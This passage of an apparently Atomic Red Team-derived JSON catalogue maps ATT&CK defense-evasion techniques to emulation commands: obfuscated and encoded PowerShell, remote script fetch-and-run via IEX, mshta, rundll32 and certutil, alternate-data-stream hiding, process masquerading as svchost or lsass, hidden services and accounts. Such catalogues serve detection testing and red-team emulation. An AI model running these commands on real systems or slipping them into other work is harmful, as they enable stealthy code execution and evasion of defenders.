            "description": "The following Atomic Test will create a file with a specific name and sets its attributes to Hidden, System, and Archive. This was related to the Snake Malware campaign and is later decrypted by Snake's kernel driver.\n[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n",
            "command": "$file = New-Item $env:windir\\registration\\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog; $file.Attributes = 'Hidden', 'System', 'Archive'; Write-Host \"File created: $($file.FullName)\""
         },
         {
            "description": "This is an obfuscated PowerShell command which when executed prints \"Hello, from PowerShell!\". Example is from the 2021 Threat Detection Report by Red Canary.\n",
            "command": "$cmDwhy =[TyPe](\"{0}{1}\" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE](\"{1}{0}{2}\"-f'nv','cO','ert')  ;  &(\"{0}{2}{3}{1}{4}\" -f'In','SiO','vOKe-EXp','ReS','n') (  (&(\"{1}{2}{0}\"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y')).\"v`ALUe\"::(\"{1}{0}\" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::\"t`OinT`16\"(( [sTring]${_}) ,8)))})) )"
         },
         {
            "description": "Creates base64-encoded PowerShell code and executes it. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute an encoded command and stdout default is \"Write-Host \"Hey, Atomic!\"\n",
            "command": "$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand); $EncodedCommand =[Convert]::ToBase64String($Bytes); $EncodedCommand; powershell.exe -EncodedCommand $EncodedCommand"
         },
         {
            "description": "Mimic execution of compressed JavaScript file. When successfully executed, calculator.exe will open. This test is meant to help emulate Gootloader as per https://redcanary.com/blog/gootloader/\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027js.zip\\T1027js.js\""
         }
      ]
   },
   "T1612": {
      "technique_name": "Build Image on Host",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. An adversary may take advantage of that build API to build a custom image on the host that includes malware downloaded from their C2 server, and then they then may utilize Deploy Container using that custom image.",
            "command": "docker build -t t1612  $PathtoAtomicsFolder/T1612/src/; docker run --name t1612_container  -d -t t1612; docker exec t1612_container ./test.sh"
         }
      ]
   },
   "T1564": {
      "technique_name": "Hide Artifacts",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "This module extracts a binary (calc.exe) from inside of another binary. \n\nIn the wild maldoc authors will use this technique to hide binaries inside of files stored \nwithin the office document itself. An example of this technique can be seen in sample\n\nf986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226\n\nThis sample contains a document inside of itself. Document 1 is the actual maldoc itself, document 2\nis the same document without all the malicious code. Document 1 will copy Document 2 to the file system\nand then \"peek\" inside of this document and pull out the oleObject.bin file. Contained inside of this\noleObject.bin file is a payload that is parsed out and executed on the file system.\n",
            "command": "$macro = [System.IO.File]::ReadAllText(\"C:\\Users\\puma-4\\Desktop\\T1564-macrocode.txt\"); $macro = $macro -replace \"aREPLACEMEa\", \"C:\\Users\\puma-4\\Desktop\\extractme.bin\"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroCode \"$macro\" -officeProduct \"Word\" -sub \"Extract\" -NoWrap"
         },
         {
            "description": "The following technique utilizes sc.exe and sdset to change the security descriptor of a service and \"hide\" it from Get-Service or sc query.\n\nUpon successful execution, sc.exe creates a new service changes the security descriptor.\n\nhttps://twitter.com/Alh4zr3d/status/1580925761996828672\nhttps://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format\n",
            "command": "sc.exe create AtomicService binPath= \"C:\\Windows\\System32\\calc.exe\" && sc sdset AtomicService \"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\""
         },
         {
            "description": "NirCmd is used by threat actors to execute commands, which can include recon and privilege escalation via running commands via the SYSTEM account\nSee https://www.kroll.com/en/insights/publications/cyber/black-basta-technical-analysis\n",
            "command": "cmd /c \"#{nircmd_location}\""
         },
         {
            "description": "Creating a user with a username containing with a space on the end",
            "command": "New-LocalUser -Name \"Administrator \" -NoPassword"
         },
         {
            "description": "Creating a user with a username containing \"$\"",
            "command": "net user $ ATOMIC123! /add /active:yes"
         }
      ]
   },
   "T1564.001": {
      "technique_name": "Hide Artifacts: Hidden Files and Directories",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Creates a file and marks it as a system file using the attrib.exe utility. Upon execution, open the file in file explorer then open Properties > Details\nand observe that the Attributes are \"SA\" for System and Archive.\n",
            "command": "attrib.exe +s %temp%\\T1564.001.txt"
         },
         {
            "description": "Disable Show Hidden files switch in registry. This technique was abused by several malware to hide their files from normal user.\nSee how this trojan abuses this technique - https://www.sophos.com/en-us/threat-center/threat-analyses/viruses-and-spyware/W32~Tiotua-P/detailed-analysis.aspx \n",
            "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f && reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v Hidden /t REG_DWORD /d 0 /f"
         },
         {
            "description": "Creates a file and marks it as hidden using the attrib.exe utility.Upon execution, open File Epxplorer and enable View > Hidden Items. Then, open Properties > Details on the file\nand observe that the Attributes are \"SH\" for System and Hidden.\n",
            "command": "attrib.exe +h %temp%\\T1564.001.txt"
         },
         {
            "description": "Hide a directory on MacOS\n",
            "command": "touch /var/tmp/T1564.001_mac.txt; chflags hidden /var/tmp/T1564.001_mac.txt"
         },
         {
            "description": "Hide a file on MacOS\n",
            "command": "xattr -lr * / 2>&1 /dev/null | grep -C 2 \"00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00\""
         },
         {
            "description": "Show all hidden files on MacOS\n",
            "command": "defaults write com.apple.finder AppleShowAllFiles YES"
         },
         {
            "description": "Requires Apple Dev Tools\n",
            "command": "setfile -a V /tmp/evil"
         },
         {
            "description": "Creates a hidden file inside a hidden directory\n",
            "command": "mkdir /var/tmp/.hidden-directory; echo \"T1564.001\" > /var/tmp/.hidden-directory/.hidden-file"
         }
      ]
   },
   "T1218.007": {
      "technique_name": "Signed Binary Proxy Execution: Msiexec",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Executes an MSI containing an embedded DLL using msiexec.exe\n",
            "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\""
         },
         {
            "description": "Executes an MSI containing embedded VBScript code using the WMI Win32_Product class\n",
            "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName"
         },
         {
            "description": "Loads a DLL into msiexec.exe and calls its DllUnregisterServer function. Note: the DLL included in the \"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.\n",
            "command": "#{msi_exe} /z \"#{dll_payload}\""
         },
         {
            "description": "Loads a DLL into msiexec.exe and calls its DllRegisterServer function. Note: the DLL included in the \"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.\n",
            "command": "#{msi_exe} /y \"#{dll_payload}\""
         },
         {
            "description": "Executes an MSI containing an embedded EXE using msiexec.exe\n",
            "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\""
         },
         {
            "description": "Executes an MSI containing embedded JScript code using the WMI Win32_Product class\n",
            "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName"
         },
         {
            "description": "Executes an MSI containing embedded JScript code using msiexec.exe\n",
            "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\""
         },
         {
            "description": "Executes an MSI containing an embedded EXE using the WMI Win32_Product class\n",
            "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName"
         },
         {
            "description": "Executes an MSI containing an embedded DLL using the WMI Win32_Product class\n",
            "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName"
         },
         {
            "description": "Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution. The MSI executes a built-in JScript payload that launches powershell.exe.\n",
            "command": "#{msi_exe} /q /i \"#{msi_payload}\""
         },
         {
            "description": "Executes an MSI containing embedded VBScript code using msiexec.exe\n",
            "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\""
         }
      ]
   },
   "T1553.001": {
      "technique_name": "Subvert Trust Controls: Gatekeeper Bypass",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Gatekeeper Bypass via command line\n",
            "command": "sudo xattr -d com.apple.quarantine myapp.app"
         }
      ]
   },
   "T1127": {
      "technique_name": "Trusted Developer Utilities Proxy Execution",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Use jsc.exe to compile javascript code stored in Library.js and output Library.dll.\nhttps://lolbas-project.github.io/lolbas/Binaries/Jsc/\nhttps://www.phpied.com/make-your-javascript-a-windows-exe/\n",
            "command": "copy \"5bdafa_LibHello.js\" %TEMP%\\LibHello.js && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\jsc.exe /t:library %TEMP%\\LibHello.js"
         },
         {
            "description": "Use jsc.exe to compile javascript code stored in scriptfile.js and output scriptfile.exe.\nhttps://lolbas-project.github.io/lolbas/Binaries/Jsc/\nhttps://www.phpied.com/make-your-javascript-a-windows-exe/\n",
            "command": "copy \"a25c19_hello.js\" %TEMP%\\hello.js && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\jsc.exe %TEMP%\\hello.js"
         }
      ]
   },
   "T1220": {
      "technique_name": "XSL Script Processing",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Executes the code specified within a XSL script tag during XSL transformation using a remote payload.\nRequires download of MSXSL.exe. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )\nOpen Calculator.exe when test successfully executed, while AV turned off.\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\msxsl.exe\" \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml\" \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl\""
         },
         {
            "description": "Executes the code specified within a XSL script using a local payload.\n",
            "command": "wmic process list /FORMAT:\"e3e9ba_wmicscript.xsl\""
         },
         {
            "description": "Executes the code specified within a XSL script tag during XSL transformation using a local payload. \nRequires download of MSXSL. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 ) \nOpen Calculator.exe when test successfully executed, while AV turned off.\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\msxsl.exe\" \"70a91b_msxslxmlfile.xml\" \"96ede8_msxslscript.xsl\""
         },
         {
            "description": "Executes the code specified within a XSL script using a remote payload. Open Calculator.exe when test successfully executed, while AV turned off.\n",
            "command": "wmic process list /FORMAT:\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl\""
         }
      ]
   },
   "T1036.003": {
      "technique_name": "Masquerading: Rename System Utilities",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "download and execute a file masquerading as images or Office files. Upon execution 3 calc instances and 3 vbs windows will be launched.\n\ne.g SOME_LEGIT_NAME.[doc,docx,xls,xlsx,pdf,rtf,png,jpg,etc.].[exe,vbs,js,ps1,etc] (Quartelyreport.docx.exe)\n",
            "command": "copy \"C:\\Windows\\System32\\calc.exe\" %temp%\\T1036.003_masquerading.docx.exe /Y && copy \"C:\\Windows\\System32\\calc.exe\" %temp%\\T1036.003_masquerading.pdf.exe /Y && copy \"C:\\Windows\\System32\\calc.exe\" %temp%\\T1036.003_masquerading.ps1.exe /Y && copy \"4bd145_T1036.003_masquerading.vbs\" %temp%\\T1036.003_masquerading.xls.vbs /Y && copy \"4bd145_T1036.003_masquerading.vbs\" %temp%\\T1036.003_masquerading.xlsx.vbs /Y && copy \"4bd145_T1036.003_masquerading.vbs\" %temp%\\T1036.003_masquerading.png.vbs /Y && copy \"107417_T1036.003_masquerading.ps1\" %temp%\\T1036.003_masquerading.doc.ps1 /Y && copy \"107417_T1036.003_masquerading.ps1\" %temp%\\T1036.003_masquerading.pdf.ps1 /Y && copy \"107417_T1036.003_masquerading.ps1\" %temp%\\T1036.003_masquerading.rtf.ps1 /Y && %temp%\\T1036.003_masquerading.docx.exe && %temp%\\T1036.003_masquerading.pdf.exe && %temp%\\T1036.003_masquerading.ps1.exe && %temp%\\T1036.003_masquerading.xls.vbs && %temp%\\T1036.003_masquerading.xlsx.vbs && %temp%\\T1036.003_masquerading.png.vbs && C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.doc.ps1 && C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.pdf.ps1 && C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.rtf.ps1"
         },
         {
            "description": "Copies powershell.exe, renames it, and launches it to masquerade as an instance of taskhostw.exe.\n\nUpon successful execution, powershell.exe is renamed as taskhostw.exe and executed from non-standard path.\n",
            "command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\taskhostw.exe /Y && cmd.exe /K %APPDATA%\\taskhostw.exe"
         },
         {
            "description": "Copies a windows exe, renames it as another windows exe, and launches it to masquerade as second windows exe\n",
            "command": "copy \"$env:ComSpec\" ($env:TEMP + \"\\svchost.exe\"); $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \"\\svchost.exe\")).Id; Stop-Process -ID $myT1036_003"
         },
         {
            "description": "Copies cscript.exe, renames it, and launches it to masquerade as an instance of notepad.exe.\n\nUpon successful execution, cscript.exe is renamed as notepad.exe and executed from non-standard path.\n",
            "command": "copy %SystemRoot%\\System32\\cscript.exe %APPDATA%\\notepad.exe /Y && cmd.exe /c %APPDATA%\\notepad.exe /B"
         },
         {
            "description": "Copies an exe, renames it as a windows exe, and launches it to masquerade as a real windows exe\n\nUpon successful execution, powershell will execute T1036.003.exe as svchost.exe from on a non-standard path.\n",
            "command": "copy \"1db90b_T1036.003.exe\" ($env:TEMP + \"\\svchost.exe\"); try { $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \"\\svchost.exe\")).Id }; catch { $_; exit $_.Exception.HResult}; Stop-Process -ID $myT1036_003"
         },
         {
            "description": "Detect LSM running from an incorrect directory and an incorrect service account\nThis works by copying cmd.exe to a file, naming it lsm.exe, then copying a file to the C:\\ folder.\n\nUpon successful execution, cmd.exe will be renamed as lsm.exe and executed from non-standard path.\n",
            "command": "copy C:\\Windows\\System32\\cmd.exe C:\\lsm.exe && C:\\lsm.exe /c echo T1036.003 > C:\\T1036.003.txt"
         },
         {
            "description": "Copies cmd.exe, renames it, and launches it to masquerade as an instance of lsass.exe.\n\nUpon execution, cmd will be launched by powershell. If using Invoke-AtomicTest, The test will hang until the 120 second timeout cancels the session\n",
            "command": "copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe && %SystemRoot%\\Temp\\lsass.exe /B"
         },
         {
            "description": "Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.\n\nUpon successful execution, sh is renamed to `crond` and executed.\n",
            "command": "cp /bin/sh /tmp/crond; echo 'sleep 5' | /tmp/crond"
         },
         {
            "description": "Copies wscript.exe, renames it, and launches it to masquerade as an instance of svchost.exe.\n\nUpon execution, no windows will remain open but wscript will have been renamed to svchost and ran out of the temp folder\n",
            "command": "copy %SystemRoot%\\System32\\wscript.exe %APPDATA%\\svchost.exe /Y && cmd.exe /c %APPDATA%\\svchost.exe \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.003\\src\\T1036.003_masquerading.vbs\""
         }
      ]
   },
   "T1218.005": {
      "technique_name": "Signed Binary Proxy Execution: Mshta",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Executes an HTA Application using JScript script engine simulating double click.",
            "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -SimulateUserDoubleClick"
         },
         {
            "description": "Executes an HTA Application with Simulate lateral movement over UNC Path.",
            "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath $env:windir\\system32\\mshta.exe"
         },
         {
            "description": "Executes an HTA Application with JScript Engine, Rundll32 and Inline Protocol Handler.",
            "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -UseRundll32 -Rundll32FilePath $env:windir\\system32\\rundll32.exe"
         },
         {
            "description": "Use Mshta to execute arbitrary PowerShell. Example is from the 2021 Threat Detection Report by Red Canary.\n",
            "command": "mshta.exe \"about:<hta:application><script language=\"VBScript\">Close(Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run%20\"\"powershell.exe%20-nop%20-Command%20Write-Host%20Hello,%20MSHTA!;Start-Sleep%20-Seconds%205\"\"\"))</script>'\""
         },
         {
            "description": "Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.\n",
            "command": "$var =Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\"; $var.content|out-file \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\"; mshta \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\"; start-sleep -s 15; stop-process -name \"calculator\" -Force"
         },
         {
            "description": "Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.\n",
            "command": "mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();"
         },
         {
            "description": "Executes an HTA Application using JScript script engine using local UNC path simulating lateral movement.",
            "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath $env:windir\\system32\\mshta.exe"
         },
         {
            "description": "Run a local VB script to run local user enumeration powershell command.\nThis attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.\nUpon execution, a new PowerShell windows will be opened that displays user information.\n",
            "command": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file PathToAtomicsFolder\\T1218.005\\src\\powershell.ps1\"\":close\")"
         },
         {
            "description": "Executes an HTA Application with JScript Engine and Inline Protocol Handler.",
            "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -MSHTAFilePath $env:windir\\system32\\mshta.exe"
         },
         {
            "description": "Executes an HTA Application by directly downloading from remote URI.",
            "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\\system32\\mshta.exe"
         }
      ]
   },
   "T1564.004": {
      "technique_name": "Hide Artifacts: NTFS File Attributes",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.\nUpon execution cmd will run and attempt to launch desktop.ini. No windows remain open after the test\n",
            "command": "if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {;     New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki;     }; Start-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,#{payload_path},>,`\"#{ads_file_path}:#{ads_name}`\"\""
         },
         {
            "description": "Create an Alternate Data Stream Directory and File with the command prompt. Write access is required. Upon execution, \nrun \"dir /A /Q /R\" in the %temp% folder to view that the alternate data stream folder exists. To view the data in the  \nalternate data stream, run \"type %temp%\\...$.......::$index_allocation\\secrets.txt\"\n",
            "command": "md %temp%\\...$.......::$index_allocation && echo too many secrets > %temp%\\...$.......::$index_allocation\\secrets.txt"
         },
         {
            "description": "Create an Alternate Data Stream with the command prompt. Write access is required. Upon execution, run \"dir /a-d /s /r | find \":$DATA\"\" in the %temp%\nfolder to view that the alternate data stream exists. To view the data in the alternate data stream, run \"notepad T1564.004_has_ads.txt:adstest.txt\"\n",
            "command": "echo cmd /c echo \"Shell code execution.\"> %temp%\\T1564.004_has_ads_cmd.txt:adstest.txt && for /f \"usebackq delims=?\" %i in (%temp%\\T1564.004_has_ads_cmd.txt:adstest.txt) do %i"
         },
         {
            "description": "Create an Alternate Data Stream with PowerShell. Write access is required. To verify execution, the the command \"ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname\"\nin the %temp% direcotry to view all files with hidden data streams. To view the data in the alternate data stream, run \"notepad.exe T1564.004_has_ads_powershell.txt:adstest.txt\" in the %temp% folder.\n",
            "command": "echo \"test\" > $env:TEMP\\T1564.004_has_ads_powershell.txt | set-content -path test.txt -stream adstest.txt -value \"test\"; set-content -path $env:TEMP\\T1564.004_has_ads_powershell.txt -stream adstest.txt -value \"test2\"; set-content -path . -stream adstest.txt -value \"test3\""
         },
         {
            "description": "Execute from Alternate Streams\n\n[Reference - 1](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)\n\n[Reference - 2](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)\n",
            "command": "type C:\\temp\\evil.exe > \"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\" && extrac32 c:\\ADS\\\\procexp.cab c:\\ADS\\\\file.txt:procexp.exe && findstr /V /L W3AllLov3DonaldTrump c:\\ADS\\\\procexp.exe > c:\\ADS\\\\file.txt:procexp.exe && certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\\temp:ttt && makecab c:\\ADS\\\\autoruns.exe c:\\ADS\\\\cabtest.txt:autoruns.cab && print /D:c:\\ADS\\\\file.txt:autoruns.exe c:\\ADS\\\\Autoruns.exe && reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg c:\\ADS\\\\file.txt:evilreg.reg && regedit /E c:\\ADS\\\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey && expand \\\\webdav\\folder\\file.bat c:\\ADS\\\\file.txt:file.bat && esentutl.exe /y c:\\ADS\\\\autoruns.exe /d c:\\ADS\\\\file.txt:autoruns.exe /o"
         },
         {
            "description": "Tool transfer to lateral hosts using Alternate Data Streams to hide implant",
            "command": "esentutl.exe /y #{location} /d \\\\#{remote.host.fqdn}\\c$\\users\\public\\splunk.log:#{exe_name}; invoke-command #{remote.host.fqdn} -scriptblock { wmic process call create \"C:\\users\\public\\splunk.log:#{exe_name} -server #{server} -group red\" }"
         }
      ]
   },
   "T1006": {
      "technique_name": "Direct Volume Access",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "This test uses PowerShell to open a handle on the drive volume via the `\\\\.\\` [DOS device path specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) and perform direct access read of the first few bytes of the volume.\nOn success, a hex dump of the first 11 bytes of the volume is displayed.\n\nFor a NTFS volume, it should correspond to the following sequence ([NTFS partition boot sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):\n```\n           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n\n00000000   EB 52 90 4E 54 46 53 20 20 20 20                 \u00ebR?NTFS\n```",
            "command": "$buffer = New-Object byte[] 11; $handle = New-Object IO.FileStream \"\\\\.\\C:\", 'Open', 'Read', 'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length); $handle.Close(); Format-Hex -InputObject $buffer"
         }
      ]
   },
   "T1218.011": {
      "technique_name": "Signed Binary Proxy Execution: Rundll32",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Test execution of a command using rundll32.exe with advpack.dll.\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml\nUpon execution calc.exe will be launched\n",
            "command": "rundll32.exe advpack.dll,LaunchINFSection \"80d0e0_T1218.011.inf\",DefaultInstall_SingleUser,1,"
         },
         {
            "description": "Rundll32.exe loading dll using ordinal value #2 to DLLRegisterServer. \nUpon successful execution, Calc.exe will spawn.\n",
            "command": "rundll32.exe \"be0315_AllTheThingsx64.dll\",#2"
         },
         {
            "description": "Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened. \nThis has been used by Win32/Poweliks malware and works as described [here](https://www.stormshield.com/news/poweliks-command-line-confusion/)\n\nNote: The GetObject function is no longer supported in Internet Explorer v9 (2011) and later so this technique would only work where very old versions of IE are installed. \n",
            "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct\").Exec();window.close();"
         },
         {
            "description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched\n",
            "command": "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)"
         },
         {
            "description": "Rundll32.exe loading dll with 'control_rundll' within the command-line, loading a .cpl or another file type related to CVE-2021-40444. \n",
            "command": "rundll32.exe shell32.dll,Control_RunDLL \"6349c0_calc.dll\""
         },
         {
            "description": "IcedID uses this TTP as follows:\n  rundll32.exe url.dll,OpenURL %PUBLIC%\\index.hta\nTrickbot uses this TTP as follows:\n  rundll32.exe URL.dll,FileProtocolHandler C:\\\\..\\\\Detail\\\\akteullen.vbs\n\nIn this atomic, the sample hta file opens the calculator and the vbs file shows a message dialog with \"rundll32 spawned wscript\"\n",
            "command": "rundll32.exe url.dll,OpenURL \"PathToAtomicsFolder\\T1218.011\\src\\index.hta\" && rundll32.exe URL.dll,FileProtocolHandler \"PathToAtomicsFolder\\T1218.011\\src\\akteullen.vbs\""
         },
         {
            "description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched\n",
            "command": "rundll32 vbscript:\"\\..\\mshtml,#135 \"+String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)"
         },
         {
            "description": "Rundll32.exe running non-dll \n",
            "command": "rundll32.exe C:\\Users\\$env:username\\Downloads\\calc.png, StartW"
         },
         {
            "description": "Executes the LaunchApplication function in pcwutl.dll to proxy execution of an executable.\n",
            "command": "rundll32.exe pcwutl.dll,LaunchApplication %windir%\\System32\\notepad.exe"
         },
         {
            "description": "Test execution of a command using rundll32.exe with syssetup.dll. Upon execution, a window saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml\n",
            "command": "rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 \"4c870d_T1218.011_DefaultInstall.inf\""
         },
         {
            "description": "Test execution of a command using rundll32.exe with ieadvpack.dll.\nUpon execution calc.exe will be launched\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml\n",
            "command": "rundll32.exe ieadvpack.dll,LaunchINFSection \"80d0e0_T1218.011.inf\",DefaultInstall_SingleUser,1,"
         },
         {
